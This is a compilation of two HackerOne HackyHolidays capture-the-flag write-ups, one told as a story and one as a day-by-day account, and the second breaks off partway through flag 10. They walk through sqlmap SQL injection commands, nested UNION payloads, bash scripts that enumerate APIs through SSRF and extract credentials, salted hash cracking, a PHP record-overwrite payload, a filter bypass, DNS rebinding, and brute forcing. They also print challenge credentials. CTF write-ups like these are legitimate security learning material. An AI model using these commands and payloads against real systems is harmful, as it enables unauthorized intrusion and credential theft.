"Adam?? This can't be true, was he helping The Grinch all this time?" it was a total shock for Mr.R3b00t. Adam is a renowned CTF creator in cybersecurity world and a close friend of Mr.R3b00t(I don't know about Mr.R3b00t, but Adam ain't a friend of mine but I would love to be his friend :) )...episode ends.
Episode - 0x08 B3tR4y4l
It wasn't time for Mr.R3b00t to think about what Adam did but to focus on the plan to stop Grinch. The forum was already online.
<image_41>
Initial recon on the forum revealed a phpmyadmin page and a login page for users and also might be for admins, Mr.R3b00t tried bypassing the login using bruteforcing user and pass, default creds, older version CVEs but nothing worked. Also, IDORs were also not the case with this one.
<image_42>
"I think it's time to hack Adam "Mr.R3b00t quickly started looking for Adam's online activities(Thanks @chron0x for the hint on this one :) ) soon enough Mr.R3b00t found Adam's Github profile https://github.com/adamtlangley There wasn't any thing suspicious in his repositories but you know Github is all about contribution, Adam's latest activities revealed a commit to "Grinch-Networks" Github profile.
<image_43>
"Mr.R3b00t at this point of time was 100% sure about Adam's involvement in the Grinch's plan".
Mr.R3b00t opened the repo https://github.com/Grinch-Networks/forum , The forum was written in PHP after looking at some files in the source code Mr.R3b00t was sure that DB interaction is taking place in the forum app, now if there is a DB there has to be a connection file for it.
Soon enough Mr.R3b00t found the DB.php file inside the repo which would be getting used to make connection with the backend database, It was time to see if there are any credentials present for the DB or not.
<image_44>
"After all it's Adam, he won't do a rookie mistake like that", Mr.R3b00t said.
MR.R3b00t was going back and take a look at other files but his sharp vision found this.
<image_45>
There was an inital commit for the file DB.php, after looking at the history of DB.php Mr.R3b00t went to the exact same line and this time he found the DB creds.
https://github.com/Grinch-Networks/forum/commit/07799dce61d7c3add39d435bdac534097de404dc#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754R134
<image_46>
"After all, Git is nothing but a stupid content tracker", Mr.R3b00t said. In his initial recon Mr.R3b00t found a phpmyadmin page on the forum, he tried the creds over there and it worked like a charm.
The DB user had access to the "users" table, the table was having username and hashed passwords.
<image_47>
Cracking the hashes revealed the password for the user "grinch"
<image_48>
It was time to login to the admin account using creds "grinch:BahHumbug", The admin account was having a post under "secret plans".
<image_49>
From this moment onwards it was a race against time for Mr.R3b00t as Grinch has already deployed his recon servers once he gets his hands on Santa's IPs he will launch the DDoS attack.
Episode - 0x09 sl33p
Mr.R3b00t now have to find a way to access The recon servers but no initial links were found, Grinch was now running a Quiz on his website "Sadistic evil creep", Mr.R3b00t took a look at it in hope of finding a lead on the recon servers.
<image_50>
At first Glance, it looked like a normal quiz with some crazy questions and options(What do you expect from a Green Ugly Monster) and an admin login page.
On a bit deep investigation Mr.R3b00t found out the flow of the quiz
Code 59 Bytes
1--> /evil-quiz/ --> /evil-quiz/start/ --> /evil-quiz/score 
The following requests were being made on each step.
<image_51>
One more thing Mr.R3b00t noted was that the 'name' param was getting reflected at the /evil-quiz/score page.
It was time to fuzz the parameters, soon enough Mr.R3b00t found an unusual behaviour the payload ' or (select sleep(15))-- - when passed via name parameter was taking much time to return the response as compared to others at this point Mr.R3b00t was a bit sure about the possible vulnerability behind the behaviour.
Mr.R3b00t quickly fired up SQLmap and ran the following command.
Code 221 Bytes
1$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" --current-db
Soon Mr.R3b00t assumptions became true, and he was sure that it is indeed a Time-Based SQLi
<image_52>
Mr.R3b00t was able to find the DB name as "quiz", now it was time to enumerate tables
Code 223 Bytes
1$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz --dump
The above sqlmap revealed two tables "sessions and "admin", looking at the content of "sessions", the table was not of much use so MR.R3b00t had the target table to look at.
Code 232 Bytes
1$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz -T admin --dump
The table admin dumped the admin credentials
<image_53>
Mr.R3b00t logged in to the admin panel using the extracted Creds.
<image_54>
Episode - 0xA H4ck3rz for Hire
Grinch has speed up the process and has started hiring people on his website for his DDoS attack. Mr.R3b00t is still looking for clues to have access on Grinch's Recon server.
The page had a registration form and a login form.
<image_55>
The basic flow was, a user can register and then login on the page, after login the user was shown the following message.
<image_56>
Initial recon revealed the following files and directories.
Tip: For quick finds use dirsearch, it's an amazing tool with an in-built oneforall wordlist.
<image_57>
Both user.php and index.php were flashing the error "You cannot access this page directly" when visited directly. The README.md file was a gold mine though, it revealed a "signup-manager" app which has been deployed on the site, the readme file had the usage and install instructions along with the default creds for the admin but as expected default creds were not working.
<image_58>
After reading the install instructions Mr.R3b00t found out that signupmanager.zip needs to be moved and unzip in the installation directory, there was a possibility that the file could be still present on the server. So MR.R3b00t requested the following URL https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip and voila Mr.R3b00t was able to download signupmanager.zip file.
The zip file contained the source code of the signup app.
<image_59>
Now to find the perfect exploit Mr.R3b00t ran the app on his local machine and performed some basic actions such as login, register etc.
The app was storing the users credentials in a file "users.txt" instead of a database, The file had the following format to store the user info.
<image_60>
There is one more thing that needed to be observed from the README.md file , it was mentioned in the file that "You can make anyone an admin by changing the last character in the users.txt file to a Y" by d3f4u17 the last character was being set as 'N' for non-admin users.
"If somehow I can overwrite the last character to 'Y' I can register as an admin",Mr.R3b00t said. The theory was accurate for an exploit but there were multiple restrictions imposed in the code to do so.
In the index.php file, the addUser function is formatting and padding all the parameters except for the hashed password as it is a constant 32 char string. In the end a sub-string of length 113 was being extracted from the final string.
<image_61>
There were also validations in place to check for the length of the passed parameters for the user signup code
<image_62>
Every parameter was getting passed through substr() function to make sure that the params do not exceed their specified length except for one, the parameter "age", one more thing that need to be noticed is that param "age" is getting validated by strlen() , is_numeric() and in the end intval() function was being used to fetch the integer value for the passed age value.
Mr.R3b00t decided to play with these three functions, After some research Mr.R3b00t found out that there are ways in PHP to express larger values in a shorter form.
For example "1e3" in PHP represents 1 x 10^3. Also, it can bypass both strlen and is_numeric.
<image_63>
Mr.R3b00t now have the perfect exploit in hand, the following values will do the Job and would overwrite the last character.
Code 186 Bytes
1curl 'http://localhost/signupmanager/' -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=signup&username=test123&password=password&age=1e9&firstname=foo&lastname=mypayloaY'
When the above values will be passed the values in the variables will be as shown below
<image_64>
The substr function will extract only the 113 characters from the resultant string which will make char 'Y' from the lastname param as the ending character.
Code 113 Bytes
1test123########5f4dcc3b5aa765d61d8327deb882cf99d81fac0b735b75cfae76604798479b6d1000000000foo############mypayloaY
It was time to test the exploit on the actual website, Mr.R3b00t passed the following request and got successfully redirected to the Admin page.
<image_65>
Mr.R3b00t finally had the lead on the recon server The admin area was having the link for the recon server https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59, It was time for the final showdown.
Episode - 0xB Inc3pti0n
Mr.R3b00t now have access to the recon server but he still needs to stop the DDoS, the site https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 was having some albums and photos of Santa(Does he hate him or obsessed with him??) that Grinch collected over the years and our lovely login page "Attack box".
From initial recon Mr.R3b00t found out the following information
<image_66>
The /uploads/ dir was giving a 403 and the /api/ endpoint has some sort of API docs for the site.
<image_67>
Enumerating the API endpoint always resulted in a 401 unauthorised, So Mr.R3b00t had to find a way to bypass this restriction so that he can enumerate the endpoints for /api/* other things that Mr.R3b00t found out, the site was having albums and albums were having photos.
For fetching an album the following request was being made https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k and for fetching the pictures the following request was being made https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9
On decoding the base64 The following JSON string was obtained.
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
Looks like internal URL calling was being done, also an "auth" key was being passed , changing the path in the "image" key resulted in "invalid authenticated hash" error, somehow the "image" and "auth" keys were associated.
<image_68>
After playing around for sometime Mr.R3b00t finally got a lead. The "hash" param was vulnerable to SQL injection, The request to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;-- was returning all the photos present in the first album
Similarly, the request to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%202,NULL,NULL;-- was returning photos from the second album.
Soon after this, Mr.R3b00t fired up sqlmap and excute the following command
Code 119 Bytes
1Python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --method get -p "hash" --dbs
The param was indeed vulnerable to sqli, sqlmap dumped two databases.
<image_69>
"recon" was kinda interesting, Next off it was time to dump the tables for "recon".
<image_70>
"It is making total sense now! Now I know why the request was dumping the photos for the first album" ..Mr.R3b00t said

Trivia

Hey! It's d3f4u17 again, Let me explain you what Mr.R3b00t understood after looking at the dumped schema.
The request that Mr.R3b00t made earlier https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;-- was exploiting the query which was being used in the backend for the table "album".
So the query that might be getting used in the backend would be something like this
Code 48 Bytes
1select id, hash, name from album where hash='?';
Now these are the payloads that helped MrR3b00t identifying the correct column count.
Code 176 Bytes
1' UNION select NULL;-- --> 404
2' UNION select NULL,NULL;-- --> 404
3' UNION select NULL,NULL,NULL;-- --> 200; column count is three
4' UNION select NULL,NULL,NULL,NULL;-- --> 404
Once Mr.R3b00t had the column count he started fuzzing the first column and the payload ' UNION select 1,NULL,NULL;-- returned the photos from the first album.
Now if we append our payload ' UNION select 1, NULL, NULL;-- it will make the resultant query as:-
Code 76 Bytes
1select id, hash, name from album where hash='' UNION select 1, NULL, NULL;--
The above query when executed will generate the following data.
Code 204 Bytes
1MariaDB [test]> select id, hash, name from album UNION select 1,null,null;
2+----+------+------+
3| id | hash | name |
4+----+------+------+
5|  1 | NULL | NULL |
6+----+------+------+
71 row in set (0.002 sec)
Also the column count in the union must be matching otherwise error will popup at the backend which is nothing but the 404 page.
But if we will request the following https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;-- the page is returning the images, this behaviour suggests that there is more than one query which is getting executed in the background because the first query is just returning the 'id' column.
Now if I am right the second query that might be executing to fetch the images from the "photo" table would be.
select id, album_id, photo from photo where album_id='?', now the id column from the output of first query is being fed to the second query to get the photos.
So if we will provide a payload something like below
Code 399 Bytes
1MariaDB [test]> select id, hash, name from album UNION select "' UNION select null,null,'xyz.jpg'",null,null;
2+------------------------------------+------+------+
3| id                                 | hash | name |
4+------------------------------------+------+------+
5| ' UNION select null,null,'xyz.jpg' | NULL | NULL |
6+------------------------------------+------+------+
71 row in set (0.108 sec)
Now the payload ' UNION select null,null,'xyz.jpg' will be fed to the second query which will make it .
Code 378 Bytes
1select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
2
3MariaDB [test]> select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
4    -> ;
5+------+----------+---------+
6| id   | album_id | photo   |
7+------+----------+---------+
8| NULL |     NULL | xyz.jpg |
9+------+----------+---------+
101 row in set (0.078 sec)
Now if we will request https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=' UNION SELECT "' UNION select NULL,NULL,'xyz.jpg';--",NULL,NULL;--
We will get the following response
<image_71>
Decoding the base64 will give the following output.
Code 91 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/xyz.jpg","auth":"5717163084e61f4b89336af25ae5d503"}
As you can see the xyz.jpg provided in the payload is getting reflected in the base64 string the "auth" token for the respective path is also being generated by the server , what if we provide "../api/test" in our payload
<image_72>
So we can now alter the path in the "image" also, requesting the URL https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3h5ei5qcGciLCJhdXRoIjoiNTcxNzE2MzA4NGU2MWY0Yjg5MzM2YWYyNWFlNWQ1MDMifQ== will now give the response as "Expected HTTP status 200, Received: 404"
Looks like we are now able to successfully call the /api/* endpoints from internal server.
Also the api document suggests that 404 refers to no valid endpoint, It was time for sum fuzzing. Now let's get back to the story..

Mr.R3b00t decided to create the script newscript.sh (F1138199) to automate the process of enumerating the api endpoints.
Code 340 Bytes
1#!/bin/bash
2
3YELLOW="\e[93m"
4NORMAL="\e[39m"
5
6OP=`curl -sgi "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x' UNION SELECT \"' UNION SELECT null,null,'$1'--+\",null,null--+" | grep -Eoi "src=\"\/r[^+]+\"" | cut -d '"' -f 2`
7OP_TWO=`curl -GkLs "https://hackyholidays.h1ctf.com$OP"`
8echo -e "${YELLOW}[$1]${NORMAL} : $OP_TWO"
Using a proper wordlist from seclist did the JOB and Mr.R3b00t found two valid endpoints
Code 110 Bytes
1cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/{}
<image_73>
Mr.R3b00t now had the valid endpoints, now the next step was to enumerate the params endpoints
Code 116 Bytes
1cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/user?{}=
<image_74>
The params "username" and "password" were two valid params for the endpoint /api/user. No valid endpoints were found on the /api/ping param though.
Trying bruteforcing username and password didn't work out but while fuzzing the params Mr.R3b00t found out that '%' sign is allowed as a wildcard.
<image_75>
"Boolean based character matching" can be done using this behaviour, Mr.R3b00t quickly created a new script enum.sh (F1138200) to enumerate username and password.
Code 378 Bytes
1#!/bin/bash
2
3OP=""
4USER=""
5CHAR=""
6VALID=""
7
8echo -e "extracting $1.."
9
10while [ 1 ]; do
11for i in $(cat chars); do
12    OP=`./newscript.sh ../api/user?$1=$CHAR$i%25 | grep -oi invalid | wc -c`
13    #echo -e "Testing -> $CHAR$i"
14    if [[ $OP -eq 8 ]]; then
15        #echo -e "Testing -> $CHAR$i"
16        CHAR="$CHAR$i"
17        echo -e "Found -> $CHAR"
18        break
19    fi
20done
21done
After executing the above script in just few minutes Mr.R3b00t had both username and password for the "attack box".
<image_76>
Without wasting anymore time Mr.R3b00t logged in to the attackbox using the creds "grinchadmin:s4nt4sucks" and what he saw next was pure horror.."Grinch has found Santa's IPs", Mr.R3b00t said.
Episode - 0xC 404 Not Found
Grinch has found Santa's IPs and is ready to launch the attack, Mr.R3b00t have to stop the Grinch before the DDoS succeeds.
<image_77>
Without wasting anymore time Mr.R3b00t started recon and looking for a loop hole in the recon app.
The "attack" button in front of each IP was launching DDoS against mentioned IP by requesting the following URL. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Decoding the base64 in the query string gives the following JSON String.
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
The key "target" was holding the target IP and the key "hash" was holding a token associated with the IP, Changing the IP and replaying the request gave the following error
<image_78>
The "hash" was associated with the "target" just like we saw earlier.
After trying multiple things Mr.R3b00t was completely blank as nothing was working or exploitable, time was running out at anytime the attack could be launched.
The only last resort remaining was to crack the hashes Mr.R3b00t wasn;t expecting much from this but he wasn't having any other choice.
Mr.R3b00t fired up hashcat and ran the following commandf ro cracking MD5s.
Code 93 Bytes
1hashcat -m0 -o crack.txt -O 5f2940d65ca4140cc18d0878bc398955 /usr/share/wordlists/rockyou.txt
But as expected It didn't work out. "Wait! what if the hashes are salted?", Mr.R3b00t said.
Just to try his luck Mr.R3b00t tried again and assumed the salt as the target IP.
Code 107 Bytes
1hashcat -m10 -O -o crack.txt 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 /usr/share/wordlists/rockyou.txt
And miraculously, it worked! Mr.R3b00t found the hidden salt "mrgrinch463".
<image_79>
Mr.R3b00t now have the salt it was time to test it, Mr.R3b00t quickly generated a hash to target the loopback IP.
Code 79 Bytes
1php > echo md5("mrgrinch463127.0.0.1");
23e3f8df1658372edf0214e202acb460b
3php >
4
Mr.R3b00t was able to bypass the "Invalid protection hash" error but got restricted again as there were restrictions to launch attack on internal IPs.
<image_80>
After multiple failed attempt to target the internal host, Mr.R3b00t decided to do a bit research and few minutes later found this https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-using-dns-rebinding-toctou
There was a way to target Internal IP using DNS rebinding, Mr.R3b00t used a service https://lock.cmpxchg8b.com/rebinder.html (didn't use 1u.ms as it is very buggy)
Mr.R3b00t hashed the target host and made the final payload(The payload of destruction).
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
After loading the above URL twice Mr.R3b00t saw and end to Grinch's agenda.
<image_81>
"Finally! It's over..",Mr.R3b00t smiled. He successfully took down the Grinch and respected his vow.
Impact
h1ctf grinch network CTF writeup.



==================================================

Report File: 1069034.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Restriction of Authentication Attempts

Contents:

The HackyHolidays
This is my first HackerOne CTF challenge writeup.
Contents:
(flag1): Day 1 (Check the files, robots.txt)
(flag2): Day 2 (one more :) jquery.min.js)
(flag3): Day 3 (People Rater)
(flag4): Day 4 (Brute Force, Swag Shop)
(flag5): Day 5 (Brute Force, Secure Login)
(flag6): Day 6 (Brute Force, My Diary)
(flag7): Day 7 (Brute Force, Hate Mail Generator)
(flag8): Day 8 (Brute Force, Forum)
(flag9): Day 9 (Brute Force, Evil Quiz)
(flag10): Day 10 (Brute Force, Signup Manager)
(flag11): Day 11 (Day 17th for me ;( ) (Brute Force, Follow the Link in Signup-Manager) Sheesh!!!
(flag12): Day 12 (TAKE DOWN GRINCH! Follow the Link provided in 11)
Flag 1
This was a fairly easy flag to find. As hacker instinct, the first place to look is the website's structure and that can be found in /robots.txt
Flag found:
<image_0>
Flag 2
This other flag is found in not so very traditional places. Like a good CTF player, I check for EXIF data in the images posted: grinch-keepout & grinch-networks, well nothing there. So I refreshed the page again and looked at one of the requests and saw one of the requests being made to jquery.min.js.
To save time, typed flag as a keyword in the response tab in the burp suite to find it, nothing. So I thought of going for a manual scavenger hunt, this snippet caught my attention.
Code 566 Bytes
1   , h1_0='la', h1_1='}', h1_2='', h1_3='f', h1_4='g', h1_5='{b7ebcb75', h1_6='8454-', h1_7='cfb9574459f7', h1_8='-9100-4f91-'; document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1); document.getElementById('alertbox').setAttribute('next-page', '/ap'+ 'ps'); function b(e, t, n) {
2            var r, i, o=(n=n||E).createElement("script"); if(o.text=e, t)for(r in c)(i=t[r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r, i); n.head.appendChild(o).parentNode.removeChild(o)
3        }
The flag is distributed in the variables, so if you have time you can manually patch the variables together to get the flag
h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1
Or you can go a little smart and call the flag by its element from the console in dev tools. The call looks very difficult to understand but its nothing complicated, all you need to do is just call the flag with its elementId: alert box, like this:
Code 48 Bytes
1console.log(document.getElementById('alertbox'))
Flag Found:
<image_1>
Flag 3
This one is also fairly easy. The new directory provided to look for /apps is the key.
(In the source however there are mysterious blank spaces)
One can only see how the people are rated by grinch in people-rater. There are names. But if you look closely in the responses for the people-rater you will notice that each person has an ID base64 encoded of course. First in the list "Tea Avery" happens to have an id eyJpZCI6MH0= which when decoded is {id:"2"}, I wonder who id:"1" is.
<image_2>
Flag 4
This flag is rather trivial if not difficult to find. Try and find a way to pull the Grinch's personal details from the online shop. As the hint gives away to find about grinch and bypass login. So the first thought is to look in the source code, nothing in there just some simple JQuery, with rather funny id names: alert alert-danger kind of throws me off the game, lol!. Anyhow the key here is an enumeration. Look at the API, so I guessed the user path sawg-shop/api/user. But it throws in the:
Code 37 Bytes
1{
2"error":"Missing required fields"
3}
So I tried guessing params, nothing worked. So I ran Arjun a tool by som3d3v, to find missing params, luckily the UUID was the param I was looking for, what next? I thought of doing API brute-forcing. Using one of the seclist's API lists I ran it to the endpoint.....waiting.... It found another 200 OK response on sessions sawg-shop/api/sessions. There are various keys along with it, but there is one which is the longest which when decoded gives:
Code 232 Bytes
1{
2"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3"cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
4}
Here we have got our UUID param value.
Flag Found:
<image_3>
Flag 5
I see another login page but this time the hint is very specific telling us to Try and find a way past the login page to get to the secret area.. As usual, I go on for looking at any hidden fields if any in the source code, nothing apart from yet another element named alert alert-danger. So another brute force? I mean the hint was very obvious since it was telling if the username is valid or not. Pulling down the longest username list, I start a brute force. Nothing found, actually, there was, I just forgot to put grep in place.
So user found: access what about the pass, I try again with a small list this time. 207p-probable password list, and coincidently it worked.
Code 31 Bytes
1user: access
2password: computer
What next, once logged in there is this message.:
Code 20 Bytes
1No Files To Download
Looking around the page, nothing. Check the responses, I see a cookie, I attach the cookie and then take it to s3cr3t-ar3a, nothing. what's next? Took a closer look at the cookie, so I try to decode it:
Code 63 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":falsZX0%3D
Ah, so we need to fix the cookie. Fixing it with setting "admin":true} and refreshing it, we see the file:
Code 31 Bytes
1my_secure_files_not_for_you.zip
I see a Zip file. At first, I thought it was a polyglot, but it's a normal zip file that is password protected. Another brute force? why not.
I download the fcrackzip program, to brute force the list. Seeing how the main concept of the CTF was to teach brute force and not to test our wordlists, I took a more conventional approach, rockyou.txt
Code 64 Bytes
1fcrackzip -u -D -p rockyou.txt my_secure_files_not_for_you.zip  
"hahahaha" it worked, I am the ultimate hacker.
No its the password hahahaha. It took like a second to break, so I was right the theme was to test brute force and not wordlist.
Flag found:
<image_4>
Flag 6
Day 6, flag 6. We need to find the missing todo in the calendar. The site seems very nice, of course, nothing Grinch worthy todo, lol.
So following the lines of previous CTFs, the only thing that seemed SUS(among us) /my-diary/?template=entries.html.
So drop your crocks and grab your socs, we have another brute force in our hand, Ffuf to rescue. Nope..... nothing.....
So my traditional wordlist failed, how about dirsearch, so I copied the dirsearch wordlist, fixed it with -D flag for FFuf to use and voila, __index worked. Very sneaky.
So the source finally reveals itself.
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Very clever, so the admin.php is renamed to secretadmin.php and moreover they get filtered out from string replace method but the flaw is its not recursive, Ahh! a well-crafted payload.
<image_5>
So somehow, we need to come up with a file name, that when stripped out of these matching keyword admin.php and secretadmin.php.
The payload would look like: secretadmsecretadmadmin.phpin.phpin.php
secretadmsecretadmadmin.phpin.phpin.php =>
secretadmsecretadm~admin.php~in.phpin.php =>
secretadm~secretadmin.php~in.php => secretadmin.php
Flag found:
<image_6>
Flag 7
This was also one of the trickiest flags I came across (till now). We start with hate-mail-generator, so in this stage, we have two options we can either view the Guess What link or create a hate mail campaign of our own.
Hmm {{name}} & {{template: }} almost reminded me of Handlebars (a way of making dynamic webpages, where you would feed the variable names to a webpage of .hbs extensions). I knew something has to be up with it.
Also while reviewing the Create New, I noticed there were two furthermore possibilities, preview or create (this always showed, Sorry but you've run out of credits), and with preview the name was always set to Alice, because of one of the hidden input field:
Code 91 Bytes
1<input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
A usual directory brute force using 'dirseach' to rescue again. The directory found /templates, which just confirmed my suspicions of handlebars, usage. Now to solve the flag we need to include the admin header 38dhs_admins_only_header.html.
<image_7>
seeing the Guess what param it was clear that we have two ways of including the flag (name, template:), it seems 3 but the footer/header.html flags are the same.
Code 134 Bytes
1{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
using the way {{temaplte:38dhs_admins_only_header.html}} in create new via preview feature, nothing. The other variable name, which I changed from Alice, to {{temaplte:38dhs_admins_only_header.html}} which looked something like this and viola..
Code 78 Bytes
1{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
Flag Found:
<image_8>
Flag 8
Ohk, not gonna lie, this was something unexpected. I knew there were only two users, but the passwords, I didn't know.
A simple directory brute force scan on the CTF link, reveals another login page /phpmyadmin apart from the one /login. Time for some brute force, I took the small password lists and tried them with the combination of, but all in vain.
Code 96 Bytes
1{
2    user: grinch
3    password: $checking$
4}
5
6and 
7
8{
9    user: max,
10    password: $checking$
11}
Github source code, took some time to find it, after some hints from team-mates. The code looks clean and fine, but with recent commits. Inspecting further in the code, one can find 4 commits, go through each one by one, small fix caught my attention. The code snippet
<image_9>
I don't know PHP but after seeing DbConnect and several minutes of googling later, I thought of them being creds, so I tried logging in phpmyadmin page and it worked.
Navigating to the user's section, we can find both users and their passwords. But passwords are MD5 hash encrypted. No worries brute force to rescue.
<image_10>
Now, time to go back to /login page and log into Grinch's account.
Flag found:
<image_11>
Flag 9
On day 9, we find ourselves being tested by Grinch, no like literally, welcome to the evil quiz.
I begin my testing with directory brute-forcing, nothing of any particular interest actually. How about taking the evil quiz, doesn't allow a name less than 3 chars, also is sensitive to 'or; since on any other responses it would respond as There is 1 other player(s) with the same name as you! but in this, it responded with I am not evil and also There is 0 other player(s) with the same name as you! lol, I see, SQLi it is.
So, the name gets perfectly reflected in the quiz area, it's after the 302 Found redirect when it reflects any change. Interesting, so in order to get a reflection, we need to use both the requests, I see.
So I bring out every hacker's fav SQLmap... with a very difficult query
Code 207 Bytes
1sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=archerl" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<YourCookie>" -D quiz --dump
It took like forever to end though, but it ended. So we have the creds from the very long SQLmap run
Code 23 Bytes
1admin:S3creT_p4ssw0rd-$
Flag found:
<image_12>
Flag 10
We have another login, ever since the secure-login, I check for each stage's source code on Github lol. So we look at the source code while simultaneously running the directory brute forcing on the web app. => nothing.
so we check the page source, and it's easy to miss at first but we see the
Code 37 Bytes
1<!-- See README.md for assistance -->
comment, very sneaky. So we download the README File.
https://hackyholidays.h1ctf.com/signup-manager/README.md
<image_13>
Reading the contents of the README.md file, a zip file is being mentioned, can we download a zip file? Yeah we can
https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
<image_14>
So we have downloaded the zip file and let's see if we can see the contents of it. (Update: Adam, reuploaded the zip file, spent an hour questioning my abilities to read PHP code) anyhow the new zip file has more files now and particularly index.php caught my attention
so to be admin, we need a special cookie and the fact that user.php is available on sever that means admin.php has to be too, but to access that page we need a special cookie. How to get that cookie? as mentioned in README.md on line 6) You can make anyone an admin by changing the last character in the users.txt file to a Y and also in the code
Code 269 Bytes
1if( isset($_COOKIE["token"]) ){
2    foreach( $all_users as $u ){
3        if( $u["cookie"] === $_COOKIE["token"] ){
4            if( $u["admin"] ){
5                $page = 'admin.php';
6            }else{
7                $page = 'user.php';
8            }
9        }
10    }
11}
How to set the admin value in function build users as Y?
Code 871 Bytes
1function buildUsers(){
2    $users = array();
3    $users_txt = file_get_contents('users.txt');
4    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
5        if( strlen($user_str) == 113 ) {
6            $username = str_replace('#', '', substr($user_str, 0, 15));
7            $users[$username] = array(
8                'username' => $username,
9                'password' => str_replace('#', '', substr($user_str, 15, 32)),
10                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
11                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
12                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
13                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
14                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
15            );
16        }
17    }
18    return $users;
19}
<image_15>
The question was how? though...after a lot of brainstorming, I saw the intval() function.
Code 185 Bytes
1if (!is_numeric($_POST["age"])) {
2    $errors[] = 'Age entered is invalid';
3}
